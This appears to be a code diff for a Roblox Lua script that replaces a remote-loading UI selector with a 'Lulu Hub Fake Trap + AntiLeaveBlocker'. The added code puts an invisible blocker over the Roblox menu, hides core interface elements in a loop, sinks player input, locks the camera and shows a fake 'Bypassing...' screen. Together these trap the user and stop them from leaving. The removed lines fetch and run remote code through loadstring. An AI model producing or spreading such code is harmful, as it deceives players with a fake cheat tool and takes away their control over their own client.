@@ -1,72 +1,160 @@
--- MASTER UI LOADER WITH UI SELECTOR
-local player = game.Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+loading screen -- Lulu Hub Fake Trap + AntiLeaveBlocker Merge
 
--- Create Selector Panel
-local selectorGui = Instance.new("ScreenGui", playerGui)
-selectorGui.Name = "UISelector"
-selectorGui.ResetOnSpawn = false
-
-local selectorFrame = Instance.new("Frame", selectorGui)
-selectorFrame.Size = UDim2.new(0, 180, 0, 120)
-selectorFrame.Position = UDim2.new(0.5, -90, 0.5, -60)
-selectorFrame.BackgroundColor3 = Color3.fromRGB(44, 62, 80)
-selectorFrame.Active = true
-selectorFrame.Draggable = true
-Instance.new("UICorner", selectorFrame).CornerRadius = UDim.new(0, 10)
-
-local function createSelectorButton(text, yOffset)
- local btn = Instance.new("TextButton", selectorFrame)
- btn.Size = UDim2.new(1, -20, 0, 40)
- btn.Position = UDim2.new(0, 10, 0, yOffset)
- btn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
- btn.TextColor3 = Color3.new(1, 1, 1)
- btn.Font = Enum.Font.GothamBold
- btn.TextScaled = true
- btn.Text = text
- Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
- return btn
-end
-
-local openFreezeTradeBtn = createSelectorButton("Open Freeze Trade UI", 10)
-local openLuluHubBtn = createSelectorButton("Open Lulu Hub UI", 60)
-
--- Attempt to load FreezeGui, fallback to dummy UI if it fails
-local success, freezeGui = pcall(function()
-    return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/FreezeGui.lua"))()
+------------------------
+-- AntiLeaveBlocker Code
+------------------------
+pcall(function()
+	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
+		game.CoreGui.AntiLeaveBlocker:Destroy()
+	end
 end)
 
-if not success or typeof(freezeGui) ~= "Instance" then
-    warn("Using fallback FreezeGui")
-    freezeGui = Instance.new("ScreenGui")
-    freezeGui.Name = "FreezeGui"
-    local label = Instance.new("TextLabel", freezeGui)
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.Text = "Freeze GUI Placeholder"
-    label.TextColor3 = Color3.new(1,1,1)
-    label.BackgroundTransparency = 1
-    label.TextScaled = true
+local BLOCK_SIZE_X = 56
+local BLOCK_SIZE_Y = 56
+local BLOCK_POS_X = 6
+local BLOCK_POS_Y = 6
+local DISPLAY_ORDER = 10000
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+
+local function tryHideRobloxMenu()
+	pcall(function()
+		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
+		for _, n in ipairs(names) do
+			local g = CoreGui:FindFirstChild(n)
+			if g then
+				pcall(function()
+					if g:IsA("ScreenGui") then
+						g.Enabled = false
+						for _, c in ipairs(g:GetChildren()) do
+							pcall(function() c.Visible = false end)
+							pcall(function() c.Enabled = false end)
+						end
+					else
+						for _, c in ipairs(g:GetDescendants()) do
+							pcall(function()
+								if c:IsA("GuiObject") then
+									c.Position = UDim2.new(-10,0,-10,0)
+								end
+							end)
+						end
+					end
+				end)
+			end
+		end
+	end)
 end
 
-freezeGui.Parent = playerGui
-freezeGui.Enabled = false
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiLeaveBlocker"
+screenGui.Parent = CoreGui
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = DISPLAY_ORDER
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Attempt to load Spawner, fallback to dummy function
-local Spawner
-local spawnerSuccess, spawnerResult = pcall(function()
-    return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
+container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+container.BackgroundTransparency = 1
+container.BorderSizePixel = 0
+container.Parent = screenGui
+
+local blocker = Instance.new("TextButton")
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.BackgroundTransparency = 1
+blocker.AutoButtonColor = false
+blocker.Text = ""
+blocker.Parent = container
+blocker.Active = true
+blocker.Selectable = false
+blocker.MouseButton1Down:Connect(function() end)
+blocker.MouseButton1Up:Connect(function() end)
+blocker.MouseButton2Down:Connect(function() end)
+blocker.MouseButton2Up:Connect(function() end)
+
+RunService.RenderStepped:Connect(function()
+	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
 end)
 
-if not spawnerSuccess or type(spawnerResult) ~= "table" or not spawnerResult.SpawnPet then
-    warn("Using fallback Spawner")
-    Spawner = {
-        SpawnPet = function(petName, x, y)
-            print("[Spawner] Pretend spawning:", petName)
-        end
-    }
-else
-    Spawner = spawnerResult
-end
+spawn(function()
+	while screenGui.Parent and screenGui.Parent == CoreGui do
+		tryHideRobloxMenu()
+		wait(2)
+	end
+end)
 
--- Lulu Hub UI loader continues (append actual LuluHub code below if needed)
--- You can re-integrate the full LuluHub UI script after this fallback setup
+-------------------------------
+-- Lulu Hub Fullscreen Trap UI
+-------------------------------
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Hide all Core UI
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+-- Freeze movement
+UserInputService.InputBegan:Connect(function(_, gpe)
+	if not gpe then
+		return Enum.ContextActionResult.Sink
+	end
+end)
+
+-- Lock camera
+local camera = workspace.CurrentCamera
+camera.CameraType = Enum.CameraType.Scriptable
+
+-- Fullscreen GUI
+local trapGui = Instance.new("ScreenGui")
+trapGui.IgnoreGuiInset = true
+trapGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+trapGui.DisplayOrder = 999999
+trapGui.Parent = PlayerGui
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+bg.Parent = trapGui
+
+-- Lulu Hub title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 100)
+title.Position = UDim2.new(0, 0, 0.35, 0)
+title.BackgroundTransparency = 1
+title.Text = "LULU HUB"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = bg
+
+-- Loading text
+local loading = Instance.new("TextLabel")
+loading.Size = UDim2.new(1, 0, 0, 50)
+loading.Position = UDim2.new(0, 0, 0.55, 0)
+loading.BackgroundTransparency = 1
+loading.Text = "Bypassing..."
+loading.TextColor3 = Color3.fromRGB(200, 200, 200)
+loading.TextScaled = true
+loading.Font = Enum.Font.Gotham
+loading.Parent = bg
+
+-- Pulsing animation
+task.spawn(function()
+	while true do
+		TweenService:Create(loading, TweenInfo.new(0.5), {TextTransparency = 0.3}):Play()
+		task.wait(0.5)
+		TweenService:Create(loading, TweenInfo.new(0.5), {TextTransparency = 0.8}):Play()
+		task.wait(0.5)
+	end
+end)
+
+-- Keep CoreGui off + camera locked
+RunService.RenderStepped:Connect(function()
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+	camera.CameraType = Enum.CameraType.Scriptable
+end)
